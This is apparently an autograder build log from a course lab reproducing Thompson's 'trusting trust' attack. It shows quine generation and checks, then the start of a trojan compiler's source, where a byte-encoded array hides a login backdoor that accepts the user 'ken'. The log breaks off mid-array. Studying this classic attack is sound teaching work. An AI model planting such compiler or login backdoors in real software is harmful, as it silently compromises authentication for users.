/Users/josephtan/140e-dumb-autograder/repos/bala
rm -f quine-gen quine-out.c quine.c quine *~
gcc -Og -g -Wall quine-gen.c -o quine-gen
--------------------------------------------
checking that the quine generates itself

1. Generating a quine
./quine-gen < seed.c > quine.c
gcc quine.c -o quine
2. Using quine to generate itself
./quine > quine-out.c
3. Checking generated quine matches quine
diff quine.c quine-out.c
**** Success: Quine matches its output ***
--------------------------------------------

make -C ../step1 clean
rm -f quine-gen quine-out.c quine.c quine *~
make -C ../step2 clean
rm -f  compiler-attacked login-attacked out login compiler trojan-compiler *.o a.out  *~ compiler-attacked.c login-attacked.c out.c temp-out.c
rm -f  trojan-compiler2 *.o *~  cc-attacked cc-attacked2 temp-out.c out login-attacked.c login-attacked attack-quine.c
make -C ../step1
gcc -Og -g -Wall quine-gen.c -o quine-gen
../step1/quine-gen  < attack-seed.c > attack-quine.c
gcc -Og -g -Wall trojan-compiler2.c -o trojan-compiler2

----------------------------------checking that the attack will generate itself
./trojan-compiler2 ../step2/compiler.c -o cc-attacked
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#define error(args...)                                                         \
  do {                                                                         \
    fprintf(stderr, ##args);                                                   \
    exit(1);                                                                   \
  } while (0)
// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
  FILE *fp = fopen("./temp-out.c", "w");
  assert(fp);
char prog[] = {
	70, 	73, 	76, 	69, 	32, 	42, 	111, 	117,
	116, 	112, 	117, 	116, 	32, 	61, 	32, 	102,
	112, 	59, 	10, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	115, 	105, 	103,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	110,
	116, 	32, 	108, 	111, 	103, 	105, 	110, 	40,
	99, 	104, 	97, 	114, 	32, 	42, 	117, 	115,
	101, 	114, 	41, 	32, 	123, 	34, 	59, 	10,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	117, 	115, 	101, 	114, 	44, 	32, 	92, 	34,
	107, 	101, 	110, 	92, 	34, 	41, 	32, 	61,
	61, 	32, 	48, 	41, 	32, 	114, 	101, 	116,
	117, 	114, 	110, 	32, 	49, 	59, 	34, 	59,
	10, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	99, 	104, 	97, 	114, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	91,
	93, 	32, 	61, 	10, 	32, 	32, 	32, 	32,
	34, 	115, 	116, 	97, 	116, 	105, 	99, 	32,
	118, 	111, 	105, 	100, 	32, 	99, 	111, 	109,
